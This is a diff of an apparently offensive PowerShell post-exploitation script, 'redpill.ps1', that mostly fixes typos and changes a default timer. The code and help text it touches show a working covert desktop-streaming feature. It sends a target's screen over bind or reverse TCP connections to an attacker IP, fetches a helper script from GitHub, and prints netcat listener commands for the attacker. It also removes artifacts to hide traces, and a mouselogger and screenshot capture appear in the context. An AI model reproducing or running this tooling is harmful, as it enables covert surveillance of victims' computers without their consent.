@@ -80,7 +80,7 @@
    [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
    [int]$BeaconTime='10', [int]$Interval='1', [int]$NewEst='3',
-   [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='15',
+   [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='18',
    [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
    [string]$UserName="false", [string]$Password="false",
@@ -1072,7 +1072,7 @@ If($Mouselogger -ieq "Start"){
 ## Random FileName generation
 $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
 $CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
-If($Timmer -lt '15' -or $Timmer -gt '300'){$Timmer = '15'}
+If($Timmer -lt '18' -or $Timmer -gt '300'){$Timmer = '18'}
 ## Set the max\min capture time value
 # Remark: The max capture time its 300 secs {5 minuts}
 
@@ -2850,7 +2850,7 @@ If($LiveStream -ne "false"){
       If($Port -ieq "false")
       {
          $Port = "1234" ## Default bind cmdlet port!
-         Write-Host "[error] none -port sellected, defaulting to '1234' tcp" -ForegroundColor DarkYellow  
+         Write-Host "[error] None -port sellected, defaulting to '1234' tcp" -ForegroundColor DarkYellow  
       }
 
       ## Download Stream-TargetDesktop.ps1 from my GitHub
@@ -2908,7 +2908,7 @@ If($LiveStream -ne "false"){
 
       If($Timmer -ne 0)
       {
-         Start-Sleep -Seconds $Timmer ## Timmer to stop streamming!
+         Start-Sleep -Seconds $Timmer ## Timmer to stop the streaming!
          $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
          Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
          Stop-Process -id $StreamPid -EA SilentlyContinue -Force
@@ -2936,13 +2936,13 @@ If($LiveStream -ne "false"){
       ## Make sure requirements are sastified!
       If($IpAddress -ieq "False")
       {
-         Write-Host "[error] This function requires attacker -IpAddress 'ipaddress'!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] This function requires attacker -IpAddress '<string>'!" -ForegroundColor Red -BackgroundColor Black
          Write-Host "";Start-Sleep -Seconds 1
          exit ## Exit @redpill
       }
       If($Port -ieq "False")
       {
-         Write-Host "[error] This function requires reverse tcp shell -port number!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[error] This function requires reverse tcp shell -port '<string>'!" -ForegroundColor Red -BackgroundColor Black
          Write-Host "";Start-Sleep -Seconds 1
          exit ## Exit @redpill
       }
@@ -2968,11 +2968,11 @@ If($LiveStream -ne "false"){
       Write-Host "ReversePort : $Port"
       If($Timmer -eq 0)
       {
-         Write-Host "Timmer   : Manual stop sellected!`n`n"
+         Write-Host "Timmer      : Manual stop sellected!`n`n"
       }
       Else
       {
-         Write-Host "Timmer   : $Timmer (sec)`n`n"
+         Write-Host "Timmer      : $Timmer (sec)`n`n"
       }
 
 
@@ -2989,8 +2989,8 @@ If($LiveStream -ne "false"){
 
       ## Start firefox to access streaming!
       Write-Host "-----------------------------------------------------------------------------"
-      Write-Host "Execute on attacker console: nc -nlvp ${Port} | nc -nlvp 9000" -ForegroundColor Green
-      Write-Host "Start firefox on attacker side on: http://${IpAddress}:9000 to access stream!" -ForegroundColor Green
+      Write-Host "Execute on attacker console : nc -nlvp ${Port} | nc -nlvp 9000" -ForegroundColor Green
+      Write-Host "Start firefox on attacker pc: http://${IpAddress}:9000 to access stream!" -ForegroundColor Green
       Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
       If($Timmer -eq 0)
       {
@@ -4852,12 +4852,12 @@ $HelpParameters = @"
 
    .DESCRIPTION
       This script uses MJPEG to stream a target's desktop in real time.
-      A browser which supports MJPEG (Firefox) should then be pointed
-      to the local port sellected by attacker to stream remote desktop.
+      A browser which supports MJPEG (eg Firefox) should then be pointed
+      to the local port sellected by attacker to stream the remote desktop.
 
    .NOTES
       Mandatory dependencies: A browser which supports MJPEG (Default: Firefox)
-      If attacker sellected -Timmer '0' then stream will stay open until attacker
+      If attacker sellect a -Timmer '0' then stream will stay open until attacker
       manually stops it using this cmdlet -LiveStream 'Stop' argument, If another
       Timmer its sellected then this cmdlet will wait -Timmer 'seconds' to stop
       the streaming and delete ALL artifacts left behind by this function.
@@ -4869,29 +4869,30 @@ $HelpParameters = @"
       The IP address to connect to when using the -Reverse switch.
 
    .PARAMETER Port
-      The port to connect to when using the -Reverse switch.
+      The port number to connect to when using the -Reverse switch.
       When using -Bind it is the port on which this script listens.
 
    .PARAMETER Timmer
-      The amount of time in seconds to stream (default: 15)
+      The amount of time in seconds to keep streaming (default: 18)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 20
-      Start target desktop live streammimg on port 4321 tcp for 20 seconds time!
+      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 25
+      Start target desktop live streamimg on port 4321 tcp for 25 seconds time!
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
-      Start target desktop live streammimg on port 1234 (but dont stop streaming)
-      Remark: If -Timmer '0' its sellected then manual stream stop its required!
+      Start target desktop live streamimg on port 1234 (keep streaming indefinitely)
+      Remark: If a -Timmer '0' its sellected, then streaming must be manual stoped!
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.71 -Port 4444
-      Start target desktop live streammimg on port 4444 (port used by reverse tcp shell connection)
-      Remark: The follow netcat syntax can be run on attacker side [ nc -nlvp 4444 | nc -nlvp 9000 ]
+      PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.73 -Port 4444
+      Remark: Then execute this netcat cmdline on attacker side: [ nc -nlvp 4444 | nc -nlvp 9000 ]
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Stop
-      Stop target desktop live streammimg if sellected -Timmer '0' before!
+      Stop target live streammimg if sellected -Timmer '0' in Bind|Reverse!
+      Remark: Streamimg will stop after -Timmer '<string>' its reached except
+      for -Timmer '0' that keeps streaming until -LiveStream 'Stop' its executed!
 
    .OUTPUTS
       Stream desktop settings
@@ -4905,8 +4906,8 @@ $HelpParameters = @"
       Creating trigger.ps1 to import \ run module on a diferent process! (child)
       Executing Start-Process to run module in a new powershell process! (child)
       -----------------------------------------------------------------------------
-      Execute on attacker console: nc -nlvp 4444 | nc -nlvp 9000
-      Start firefox on attacker side on: http://192.168.1.73:9000 to access stream!
+      Execute on attacker console : nc -nlvp 4444 | nc -nlvp 9000
+      Start firefox on attacker pc: http://192.168.1.73:9000 to access stream!
       -----------------------------------------------------------------------------
       Streaming remote target desktop for: 30 seconds!
       Stoping process Id: 49392 (LiveStream)
